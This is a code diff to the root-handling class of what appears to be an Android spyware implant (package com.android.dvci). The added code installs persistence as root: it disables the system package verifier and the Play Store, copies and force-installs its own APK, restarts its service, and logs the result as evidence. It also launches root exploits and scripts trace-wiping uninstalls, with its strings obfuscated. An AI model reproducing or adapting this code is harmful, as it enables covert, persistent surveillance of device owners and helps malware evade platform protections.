@@ -7,6 +7,8 @@ import com.android.dvci.auto.Cfg;
 import com.android.dvci.capabilities.PackageInfo;
 import com.android.dvci.conf.Configuration;
 import com.android.dvci.crypto.Keys;
+import com.android.dvci.evidence.EvidenceBuilder;
+import com.android.dvci.evidence.Markup;
 import com.android.dvci.file.AutoFile;
 import com.android.dvci.file.Path;
 import com.android.dvci.util.ByteArray;
@@ -17,14 +19,22 @@ import com.android.dvci.util.StringUtils;
 import com.android.dvci.util.Utils;
 import com.android.mm.M;
 
+import java.io.BufferedInputStream;
+import java.io.BufferedOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
+import java.io.ObjectInput;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.io.OutputStream;
+import java.io.Serializable;
 import java.security.InvalidAlgorithmParameterException;
 import java.security.InvalidKeyException;
 import java.security.NoSuchAlgorithmException;
+import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.Date;
 import java.util.Properties;
@@ -43,7 +53,10 @@ public class Root {
 	private static int askedSu = 0;
 	private static boolean oom_adjusted;
 	private final static String SU = M.e("su");
+	private Markup markupOldApk;
 	static Semaphore semGetPermission = new Semaphore(1);
+	//private static final int DEL_OLD_FILE_MARKUP = 1;
+	private static Markup markup = new Markup(Markup.DEL_OLD_FILE_MARKUP);
 
 	static public boolean isNotificationNeeded() {
 		if (Cfg.OSVERSION.equals("v2") == false) {
@@ -102,7 +115,7 @@ public class Root {
 			Status.setExploitResult(Status.EXPLOIT_RESULT_NOTNEEDED);
 			Status.setExploitStatus(Status.EXPLOIT_STATUS_EXECUTED);
 			return false;
-		}else if(PackageInfo.upgradeRoot()){
+		} else if (PackageInfo.upgradeRoot()) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(exploitPhone): root shell upgraded, no need to exploit again");
 			}
@@ -167,6 +180,11 @@ public class Root {
 
 	}
 
+	public static boolean isArtInUse() {
+		final String vmVersion = System.getProperty("java.vm.version");
+		return vmVersion != null && vmVersion.startsWith("2");
+	}
+
 
 	static public void adjustOom() {
 		if (Status.haveRoot() == false) {
@@ -216,7 +234,67 @@ public class Root {
 		}
 	}
 
-	static public boolean uninstallRoot() {
+	public static Boolean saveSerToFile(AutoFile f, Serializable s) {
+		try {
+			OutputStream file = new FileOutputStream(f.getFile());
+			OutputStream buffer = new BufferedOutputStream(file);
+			ObjectOutputStream oos = new ObjectOutputStream(buffer);
+			oos.writeObject(s);
+			oos.close();
+			return true;
+		} catch (Exception e) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(saveStringToSerFile)" + e);
+			}
+		}
+		return false;
+	}
+
+	public static Serializable getSerFromFile(AutoFile f) {
+		Serializable res = null;
+		try {
+			InputStream file = new FileInputStream(f.getFile());
+			InputStream buffer = new BufferedInputStream(file);
+			ObjectInput input = new ObjectInputStream(buffer);
+			//deserialize the List
+			res = (Serializable) input.readObject();
+		} catch (ClassNotFoundException ex) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(getStringFromObj) Cannot perform input. Class not found." + ex);
+			}
+		} catch (IOException ex) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(getStringFromObj) Cannot perform input." + ex);
+			}
+		}
+		return res;
+	}
+
+	private static void addOldFileMarkup(String s) {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (addOldFileMarkup) ");
+		}
+		ArrayList<String> al = markup.unserialize(new ArrayList<String>());
+		al.add(s);
+		markup.serialize(al);
+	}
+
+	private static void delOldFileMarkup(Boolean isPersisten) {
+		ArrayList<String> fl = markup.unserialize(new ArrayList<String>());
+		if (isPersisten && !fl.isEmpty()) {
+			String command = M.e("export LD_LIBRARY_PATH=/vendor/lib:/system/lib") + "\n";
+			for (String s : fl) {
+				command += String.format(M.e("for i in `ls  %s`; do [ -e $i ] && rm $i; done"), s) + "\n";
+			}
+			ExecuteResult pers = Execute.executeRoot(command);
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (installPersistence) rm old file:\n" + pers.getStdout());
+			}
+		}
+		markup.removeMarkup();
+	}
+
+	synchronized static public boolean uninstallRoot() {
 		if (Status.haveRoot() == false) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (uninstallRoot): cannot uninstall this way without root privileges"); //$NON-NLS-1$
@@ -225,40 +303,168 @@ public class Root {
 			return false;
 		}
 
-		// 32_34=#!/system/bin/sh
-
 		String packageName = Status.self().getAppContext().getPackageName();
-		String script = M.e("#!/system/bin/sh") + "\n";
-		//script += Configuration.shellFile + " qzx \"rm -r " + Path.hidden() + "\"\n";
-		script += "rm -r " + Path.hidden() + "\n";
-		script += Configuration.shellFile + " ru\n";
-		script += "LD_LIBRARY_PATH=/vendor/lib:/system/lib pm uninstall " + packageName + "\n";
-		if (Cfg.DEBUG) {
-			script += "rm /data/local/tmp/log\n";
-		}
+		String apkPath = Status.getApkName();
+		if (apkPath != null) {
 
-		String filename = "c";
-		if (createScript(filename, script) == false) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (uninstallRoot): failed to create uninstall script"); //$NON-NLS-1$
+			Status.setIconState(false);
+			//String script = M.e("#!/system/bin/sh") + "\n";
+			//script += M.e("export LD_LIBRARY_PATH=/vendor/lib:/system/lib") + "\n";
+			//script += Configuration.shellFile + " qzx \"rm -r " + Path.hidden() + "\"\n";
+			String script = "";
+			if (new AutoFile(Path.hidden()).exists()) {
+				script += M.e("rm -r ") + Path.hidden() + "\n";
 			}
+			script += Configuration.shellFile + M.e(" blw") + "\n";
+			/* we need to remove also /data/data/pkgName ? */
+			if (Status.getAppDir() != null) {
+				if (new AutoFile(Status.getAppDir()).exists()) {
+					script += M.e("rm -r ") + Status.getAppDir() + "\n";
+				}
+			}
+
+			// TODO: mettere Status.persistencyApk e packageName
+			script += M.e("for i in `ls /data/app/*com.android.dvci* 2>/dev/null`; do [ -e $i ] && rm  $i; done") + "\n";
+			script += M.e("for i in `ls /data/dalvik-cache/*com.android.dvci* 2>/dev/null`; do [ -e $i ] && rm  $i; done") + "\n";
+			script += M.e("for i in `ls /data/dalvik-cache/*StkDevice* 2>/dev/null`; do [ -e $i ] && rm  $i; done") + "\n";
+
+			script += M.e("pm clear ") + packageName + "\n";
+			script += M.e("pm disable ") + packageName + "\n";
+			script += M.e("pm uninstall ") + packageName + "\n";
+			//script += M.e("pm enable ") + packageName + "\n";
+				/* todo: do it manually? without pm intervention
+				 * 1) edit /data/system/packages.xml
+				 * 2) edit /data/system/packages.list
+				 * 3) /data/system/packages-stopped.xml does it really exist
+				 * 4) add at the end of the scrip /data/app/<apkPath>.apk removal
+				 */
+
+			// the
+			script += String.format(M.e(" [ -e %s ] && rm %s 2>/dev/null"), Status.persistencyApk, Status.persistencyApk) + "\n";
+			script += String.format(M.e(" [ -e %s ] && rm -r %s 2>/dev/null"), M.e("/sdcard/.lost.found"), M.e("/sdcard/.lost.found")) + "\n";
+			script += String.format(M.e(" [ -e %s ] && rm -r %s 2>/dev/null"), M.e("/sdcard/1"), M.e("/sdcard/1")) + "\n";
+			script += String.format(M.e(" [ -e %s ] && rm -r %s 2>/dev/null"), M.e("/sdcard/2"), M.e("/sdcard/2")) + "\n";
+			script += Configuration.shellFile + M.e(" blr") + "\n";
+			script += Configuration.shellFile + M.e(" ru") + "\n";
+			script += M.e("sleep 1; ") + String.format(M.e(" [ -e %s ] && rm %s 2>/dev/null"), apkPath, apkPath) + "\n";
+
+
+			ArrayList<String> fl = markup.unserialize(new ArrayList<String>());
+			if (!fl.isEmpty()) {
+				for (String s : fl) {
+					script += String.format(M.e("for i in `ls  %s 2>/dev/null`; do [ -e $i ] && rm $i 2>/dev/null; done"), s) + "\n";
+				}
+			}
+			markup.removeMarkup();
+
+
+			if (Cfg.DEBUG) {
+				if (new AutoFile(M.e("rm /data/local/tmp/log 2>/dev/null")).exists()) {
+					script += M.e("rm /data/local/tmp/log 2>/dev/null") + "\n";
+				}
+			}
+
+			boolean ret = Execute.executeRootAndForgetScript(script);
+			if(!ret){
+				Execute.executeScript(script);
+			}
+
+			Utils.sleep(5000);
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (uninstallRoot): uninstalled"); //$NON-NLS-1$
+			}
+
+			return true;
+		} else {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (uninstallRoot): failed"); //$NON-NLS-1$
+			}
+		}
+		return false;
+	}
+
+
+	static synchronized boolean installPersistence(Boolean forceInstall) {
+		android.content.pm.PackageInfo pi = null;
+		String apkPosition = null;
+		Boolean isPersistent = false;
+
+		if ((apkPosition = Status.getApkName()) != null && !Status.isMelt()) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (installPersistence): found apk installed in: " + apkPosition);
+			}
+			isPersistent = Status.isPersistent();
+		} else {
 			return false;
 		}
 
-		Execute ex = new Execute();
-		ExecuteResult result = ex.executeRoot(Status.getAppContext().getFilesDir() + "/" + filename);
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (uninstallRoot) result stdout: %s stderr: %s", StringUtils.join(result.stdout),
-					StringUtils.join(result.stderr));
+		if (isPersistent || Status.persistencyReady()) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (installPersistence): already persistent!! ");
+			}
+
+			delOldFileMarkup(isPersistent);
+
+			if (Status.needReboot()) {
+				Status.setPersistencyStatus(Status.PERSISTENCY_STATUS_PRESENT_TOREBOOT);
+			} else {
+				Status.setPersistencyStatus(Status.PERSISTENCY_STATUS_PRESENT);
+			}
+			EvidenceBuilder.info(M.e("Persistence"));
+			return true;
 		}
 
-		removeScript(filename);
-
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (uninstallRoot): uninstalled"); //$NON-NLS-1$
+		if(Cfg.DEMO){
+			Status.self().makeToast("Install Persistence");
 		}
 
-		return true;
+		Execute.execute(new String[]{Configuration.shellFileBase, "blw"});
+		addOldFileMarkup(String.format(M.e("%s*"), apkPosition.split("-")[0]));
+
+		String packageName = Status.self().getAppContext().getPackageName();
+
+		String perPkg = Status.persistencyApk;
+		String command = M.e("export LD_LIBRARY_PATH=/vendor/lib:/system/lib") + "\n";
+		command += M.e("settings put global package_verifier_enable 0") + "\n";
+		command += M.e("pm disable com.android.vending") + "\n";
+		command += M.e("sleep 1") + "\n";
+		command += String.format(M.e("cat %s > ") + perPkg, apkPosition) + "\n";
+		command += M.e("chmod 644 ") + perPkg + "\n";
+		command += String.format(M.e("[ -s %s ] && pm install -r -f "), perPkg) + perPkg + "\n";
+		command += M.e("sleep 1") + "\n";
+
+		command += M.e("installed=$(pm list packages ") + packageName + ")\n";
+		command += M.e("if [ ${#installed} -gt 0 ]; then") + "\n";
+		command += M.e("am startservice ") + packageName + M.e("/.ServiceMain") + "\n";
+		command += M.e("am broadcast -a android.intent.action.USER_PRESENT") + "\n";
+		command += M.e("fi") + "\n";
+		command += M.e("sleep 2") + "\n";
+		command += M.e("settings put global package_verifier_enable 1") + "\n";
+		command += M.e("pm enable com.android.vending") + "\n";
+		command += Configuration.shellFileBase + M.e(" blr") + "\n";
+
+		ExecuteResult ret = Execute.executeScript(command);
+
+		Utils.sleep(1000);
+		ExecuteResult pers = Execute.executeRoot(M.e("ls -l ") + perPkg);
+		String persString = pers.getStdout();
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (installPersistence) inst: " + ret.getStdout());
+			Check.log(TAG + " (installPersistence) ls: " + pers.getStdout());
+		}
+
+		if (persString.contains(perPkg)) {
+			if (Status.needReboot()) {
+				Status.setPersistencyStatus(Status.PERSISTENCY_STATUS_PRESENT_TOREBOOT);
+			} else {
+				Status.setPersistencyStatus(Status.PERSISTENCY_STATUS_PRESENT);
+			}
+			EvidenceBuilder.info(M.e("Persistence installed"));
+			return true;
+		}
+		Status.setPersistencyStatus(Status.PERSISTENCY_STATUS_FAILED);
+		return false;
 	}
 
 	// Prendi la root tramite superuser.apk
@@ -303,7 +509,7 @@ public class Root {
 				Check.log(TAG + " (supersuRoot) execute 2: " + suidext + " ret: " + res.exitCode);
 			}
 
-			if(res.exitCode == 254){
+			if (res.exitCode == 254) {
 
 				String script = M.e("#!/system/bin/sh") + "\n"
 						+ String.format(M.e("%s rt"), suidext.getFilename()) + "\n";
@@ -415,7 +621,6 @@ public class Root {
 
 			if (PackageInfo.checkRoot()) {
 				Status.setRoot(true);
-
 				Status.self().setReload();
 			}
 
@@ -583,7 +788,7 @@ public class Root {
 
 	private static void checkExploitThread(Thread exploit, int timeOutSec) {
 		int secs = 5;
-		for (int i = 0; i < timeOutSec || timeOutSec == 0; i+=secs) {
+		for (int i = 0; i < timeOutSec || timeOutSec == 0; i += secs) {
 			try {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (checkExploitThread):" + exploit.getName());
@@ -605,6 +810,21 @@ public class Root {
 		}
 	}
 
+
+	public static  void installPersistence() {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (installPersistence): tryInstall PERSISTENCE=" + Cfg.PERSISTENCE + " root=" + Status.haveRoot() + " status=" + Status.getPersistencyStatus() + " isGuiVisible= " +
+					Status.isGuiVisible());
+		}
+
+		synchronized(Status.uninstallLock) {
+			if (Cfg.PERSISTENCE && Status.haveRoot() && !Status.uninstall && Status.getPersistencyStatus() == Status.PERSISTENCY_STATUS_TO_INSTALL && !Status.isGuiVisible()) {
+				Root.installPersistence(false);
+				Status.self().setReload();
+			}
+		}
+	}
+
 	private static void linuxExploit(boolean synchronous, boolean frama, boolean selinux, boolean towel) {
 
 		class CET implements Runnable {
@@ -619,6 +839,7 @@ public class Root {
 				if (PackageInfo.checkRoot()) {
 					Status.setExploitResult(Status.EXPLOIT_RESULT_SUCCEED);
 					Status.setRoot(true);
+					installPersistence();
 					Status.self().setReload();
 				} else {
 					Status.setExploitResult(Status.EXPLOIT_RESULT_FAIL);
@@ -632,7 +853,7 @@ public class Root {
 		LinuxExploitThread linuxThread = new LinuxExploitThread(frama, selinux, towel);
 		Thread exploit = new Thread(linuxThread);
 		if (Cfg.DEBUG) {
-			exploit.setName("LinuxExploitThread_"+frama+"_"+selinux+"_"+towel);
+			exploit.setName("LinuxExploitThread_" + frama + "_" + selinux + "_" + towel);
 		}
 		Status.setExploitStatus(Status.EXPLOIT_STATUS_RUNNING);
 		exploit.start();
@@ -642,10 +863,10 @@ public class Root {
 		}
 		/* wait for 15 seconds  to see if exploits ends*/
 		checkExploitThread(exploit, 15);
-		if(exploit.isAlive()){
-		if (Cfg.DEBUG) {
-			Check.log(TAG + "(linuxExploit): 15 seconds passed, going synchronous=" + synchronous);
-		}
+		if (exploit.isAlive()) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(linuxExploit): 15 seconds passed, going synchronous=" + synchronous);
+			}
 		}
 		if (exploit.isAlive() && synchronous) {
 			checkExploitThread(exploit, 0);
@@ -666,6 +887,11 @@ public class Root {
 	// name WITHOUT path (script is generated inside /data/data/<package>/files/
 	// directory)
 	static public boolean createScript(String name, String script) {
+		return createScript(name, script, null);
+	}
+
+	static public boolean createScript(String name, String script, String absolutPaht) {
+		String absP = Status.getAppContext().getFilesDir() + "/" + name;
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (createScript): script: " + script); //$NON-NLS-1$
 		}
@@ -674,8 +900,10 @@ public class Root {
 			FileOutputStream fos = Status.getAppContext().openFileOutput(name, Context.MODE_PRIVATE);
 			fos.write(script.getBytes());
 			fos.close();
-
-			Execute.execute("chmod 755 " + Status.getAppContext().getFilesDir() + "/" + name);
+			if (absolutPaht != null) {
+				absolutPaht = absP;
+			}
+			Execute.execute("chmod 755 " + absP);
 
 			return true;
 		} catch (Exception e) {
@@ -732,7 +960,7 @@ public class Root {
 	 */
 	static public boolean getPermissions(boolean reload) {
 
-		if(Status.getExploitStatus() < Status.EXPLOIT_STATUS_EXECUTED){
+		if (Status.getExploitStatus() < Status.EXPLOIT_STATUS_EXECUTED) {
 			return false;
 		}
 
@@ -786,6 +1014,8 @@ public class Root {
 				}
 				// Avoid having the process killed for using too many resources
 				Root.adjustOom();
+				installPersistence();
+
 			} else {
 				Configuration.shellFile = Configuration.shellFileBase;
 			}
@@ -796,6 +1026,7 @@ public class Root {
 		}
 		return Status.haveRoot();
 	}
+
 
 	static public InputStream decodeEnc(InputStream stream, String passphrase) throws IOException,
 			NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException, InvalidAlgorithmParameterException {
@@ -864,7 +1095,7 @@ public class Root {
 			Utils.sleep(600);
 			// /system/bin/ntpsvd qzx chmod 666
 			// /data/data/com.android.service/files/packages.xml
-			Execute.chmod("666", String.format(M.e("/data/data/%s/files/packages.xml"),pack));
+			Execute.chmod("666", String.format(M.e("/data/data/%s/files/packages.xml"), pack));
 
 			// Rimuoviamo il file temporaneo
 			// /data/data/com.android.service/files/test
